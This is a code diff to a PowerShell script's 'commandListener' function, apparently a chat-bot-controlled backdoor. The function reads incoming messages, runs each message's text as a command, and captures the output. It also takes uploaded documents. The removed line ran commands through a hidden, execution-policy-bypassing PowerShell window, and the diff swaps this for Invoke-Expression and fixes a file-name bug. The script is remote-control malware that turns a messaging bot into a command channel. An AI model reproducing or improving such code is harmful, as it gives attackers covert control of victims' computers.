@@ -161,7 +161,7 @@ function commandListener
             $text       = $message.text                                                 # Get the text message (it will be the command that you want to execute)
             $document   = $message.document                                             # If there is a document value inside the JSON record save it to this variable
             
-            $recovered_data = 'Data recovered from the GET request: {0}, {1}, {2}, {3}, {4}' -f $message, $message_id, $user_id, $text, $document
+            $recovered_data = 'Data recovered from the GET request: {0}, ID: {1}, DOCUMENT: {2}' -f $message, $user_id, $document
             Write-Host $recovered_data
             
             Write-Host "Check for a new incoming command..."
@@ -187,7 +187,7 @@ function commandListener
                     {
                         try {
                             Write-Host "Executing it..."
-                            $output = Powershell.exe -ep Bypass -WindowStyle Hidden -Command $text
+                            $output = Invoke-Expression -Command $text
                             Write-Host "Converting the output captured to a String..."
                             $output = $output | Out-String
                         } catch {
@@ -225,7 +225,7 @@ function commandListener
                     if ($document) {
                         Write-Host "Getting the informations about the file..."
                         $file_id   = $document.file_id
-                        $file_name = $document.$file_name
+                        $file_name = $document.file_name
                         
                         Write-Host "File informations: [$file_id] [$file_name]"
 
